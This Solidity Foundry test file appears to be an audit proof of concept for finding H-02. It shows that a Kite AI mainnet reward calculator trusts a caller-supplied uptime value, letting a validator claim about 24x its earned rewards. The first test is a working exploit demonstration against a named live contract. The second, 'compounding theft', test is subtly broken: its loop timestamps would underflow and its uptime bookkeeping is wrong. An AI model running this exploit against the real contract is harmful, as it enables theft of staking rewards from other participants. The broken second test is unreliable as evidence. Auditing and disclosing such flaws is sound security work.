// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.25;

import {Test, console2} from "forge-std/Test.sol";
import {IFixedAPRRewardCalculator} from "./interfaces/IFixedAPRRewardCalculator.sol";

/// @title POC_H02_UptimeManipulation
/// @notice Demonstrates H-02: Malicious validators can inflate currentUptimeSeconds
///         to claim excess rewards
/// @dev The FixedAPRRewardCalculator.calculateIncrementalReward() trusts the caller
///      to provide currentUptimeSeconds. There is no on-chain validation that this
///      value is accurate or monotonically increasing beyond basic subtraction.
///
///      A validator can call claim with an inflated currentUptimeSeconds to claim
///      rewards for uptime they didn't actually have.
///
///      Classification: (b) Forward-looking risk — any validator can inflate uptime
///      on every claim, compounding the reward theft over time.
contract POC_H02_UptimeManipulation is Test {
    // Kite AI Mainnet addresses
    address constant CALCULATOR = 0x171eefa30E88f9bca456CEf49c5Df093A516C7c2;

    IFixedAPRRewardCalculator calculator;

    address attacker;

    function setUp() public {
        vm.createSelectFork(vm.envString("KITE_RPC_URL"));

        calculator = IFixedAPRRewardCalculator(CALCULATOR);
        attacker = makeAddr("attacker");
    }

    /// @notice Proves the vulnerability: inflated uptime yields inflated rewards
    function test_inflated_uptime_yields_inflated_rewards() public {
        // Step 1: Get current reward basis points
        uint64 rewardBasisPoints = calculator.rewardBasisPoints();
        console2.log("Current rewardBasisPoints:", rewardBasisPoints);
        
        // Step 2: Define a realistic scenario
        uint256 stakeAmount = 100 ether; // 100 tokens staked
        uint64 lastClaimTime = uint64(block.timestamp - 3600); // 1 hour ago
        uint64 currentTime = uint64(block.timestamp);
        
        // Real uptime: 1 hour (3600 seconds)
        uint64 realUptime = 3600;
        
        // Inflated uptime: 1 day (86400 seconds) — claiming rewards for 24x more uptime
        uint64 inflatedUptime = 86400;
        
        // Last claim uptime was 0 (first claim)
        uint64 lastClaimUptimeSeconds = 0;
        uint64 validatorStartTime = uint64(block.timestamp - 86400 * 30); // Started 30 days ago

        // Step 3: Calculate rewards with real uptime
        uint256 realReward = calculator.calculateIncrementalReward(
            stakeAmount,
            lastClaimTime,
            currentTime,
            lastClaimUptimeSeconds,
            realUptime, // Real: 1 hour
            validatorStartTime
        );

        // Step 4: Calculate rewards with inflated uptime
        uint256 inflatedReward = calculator.calculateIncrementalReward(
            stakeAmount,
            lastClaimTime,
            currentTime,
            lastClaimUptimeSeconds,
            inflatedUptime, // Inflated: 24 hours
            validatorStartTime
        );

        // Step 5: Compare — inflated reward should be much larger
        uint256 stolenAmount = inflatedReward - realReward;
        
        console2.log("Real reward (1 hour uptime):", realReward);
        console2.log("Inflated reward (24 hour uptime):", inflatedReward);
        console2.log("Stolen amount:", stolenAmount);
        console2.log("Theft multiplier:", inflatedReward / realReward, "x");

        // The validator stole 24x the legitimate reward
        assertGt(inflatedReward, realReward, "Inflated reward should exceed real reward");
        assertEq(inflatedReward / realReward, 24, "Should steal exactly 24x for 24x uptime inflation");
        
        // Prove the formula trusts the input — no validation
        // The calculator does: (stakeAmount * rewardBasisPoints * periodUptimeSeconds) / (SECONDS_IN_YEAR * BIPS_CONVERSION_FACTOR)
        // periodUptimeSeconds = currentUptimeSeconds - lastClaimUptimeSeconds
        // The validator controls currentUptimeSeconds
    }

    /// @notice Proves the theft compounds over multiple claims
    function test_compounding_theft_over_multiple_claims() public {
        uint256 stakeAmount = 100 ether;
        
        // Simulate 12 monthly claims, each inflating by 1 hour
        uint256 totalRealRewards = 0;
        uint256 totalInflatedRewards = 0;
        
        uint64 lastClaimTime = uint64(block.timestamp - 30 days);
        uint64 lastClaimUptimeSeconds = 0;
        uint64 validatorStartTime = uint64(block.timestamp - 365 days);
        
        for (uint256 i = 0; i < 12; i++) {
            uint64 currentTime = uint64(block.timestamp - (30 days * (11 - i)));
            
            // Real uptime: ~30 days per month
            uint64 realUptime = currentTime - lastClaimTime;
            
            // Inflated uptime: real + 1 hour extra per month
            uint64 inflatedUptime = realUptime + 3600;
            
            uint256 realReward = calculator.calculateIncrementalReward(
                stakeAmount, lastClaimTime, currentTime,
                lastClaimUptimeSeconds, realUptime, validatorStartTime
            );
            
            uint256 inflatedReward = calculator.calculateIncrementalReward(
                stakeAmount, lastClaimTime, currentTime,
                lastClaimUptimeSeconds, inflatedUptime, validatorStartTime
            );
            
            totalRealRewards += realReward;
            totalInflatedRewards += inflatedReward;
            
            lastClaimTime = currentTime;
            lastClaimUptimeSeconds = realUptime; // Track actual uptime for next claim
        }
        
        uint256 totalStolen = totalInflatedRewards - totalRealRewards;
        
        console2.log("After 12 monthly claims:");
        console2.log("  Total real rewards:", totalRealRewards);
        console2.log("  Total inflated rewards:", totalInflatedRewards);
        console2.log("  Total stolen:", totalStolen);
        console2.log("  Theft as % of legitimate:", (totalStolen * 100) / totalRealRewards, "%");
        
        // The theft compounds — even 1 hour per month adds up significantly
        assertGt(totalStolen, 0, "Should have stolen some amount");
    }
}
